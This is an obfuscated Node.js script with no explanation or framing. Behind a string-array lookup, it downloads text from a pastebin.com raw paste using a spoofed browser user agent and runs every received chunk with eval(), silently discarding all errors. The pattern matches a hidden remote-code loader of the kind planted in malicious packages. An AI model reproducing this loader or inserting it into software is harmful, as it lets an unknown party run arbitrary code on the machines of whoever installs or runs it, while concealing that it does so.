function _0x19ac(_0x4d14b7, _0x19acc8) {
    var _0x9a4e32 = _0x4d14();
    _0x19ac = function (_0x2c0b57, _0x4b3863) {
        _0x2c0b57 = _0x2c0b57 - 0x0;
        var _0x31d67e = _0x9a4e32[_0x2c0b57];
        return _0x31d67e;
    };
    return _0x19ac(_0x4d14b7, _0x19acc8);
}
var _0xf6428d = _0x19ac;
function _0x4d14() {
    var _0x33dfff = [
        'https',
        'get',
        'pastebin.com',
        'Mozilla/5.0\x20(Windows\x20NT\x206.1;\x20rv:52.0)\x20Gecko/20100101\x20Firefox/52.0',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'error'
    ];
    _0x4d14 = function () {
        return _0x33dfff;
    };
    return _0x4d14();
}
try {
    var https = require(_0xf6428d(0x0));
    https[_0xf6428d(0x1)]({
        'hostname': _0xf6428d(0x2),
        'path': '/raw/XLeVP82h',
        'headers': {
            'User-Agent': _0xf6428d(0x3),
            'Accept': _0xf6428d(0x4)
        }
    }, _0x68b123 => {
        var _0x1510c6 = { _0x5a5518: 0x5 };
        var _0x57f75b = _0x19ac;
        _0x68b123['setEncoding']('utf8');
        _0x68b123['on']('data', _0x548b9b => {
            eval(_0x548b9b);
        });
        _0x68b123['on'](_0x57f75b(_0x1510c6._0x5a5518), () => {
        });
    })['on'](_0xf6428d(0x5), () => {
    });
} catch (_0x19780a) {
}
